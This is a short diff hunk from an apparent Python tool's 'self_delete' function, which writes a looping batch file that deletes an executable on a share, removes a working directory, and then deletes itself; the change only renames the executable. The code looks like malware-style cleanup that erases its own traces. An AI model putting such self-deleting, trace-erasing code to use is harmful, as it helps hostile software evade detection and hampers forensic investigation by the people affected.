@@ -99,7 +99,7 @@ def self_delete():
     try:
         f = open("C:\\killfile.bat".format(c), 'w')
         f.write(":Repeat\n")
-        f.write("del \"C:\\share2\\M4v1.0.exe\"\n")
+        f.write("del \"C:\\share2\\M4_v1.0.exe\"\n")
         f.write("rmdir \"C:\\{}\"\n".format(dri))
         f.write("if exist {} goto Repeat\n".format(dri))
         f.write("del /s /q \"C:\\killfile.bat\"")
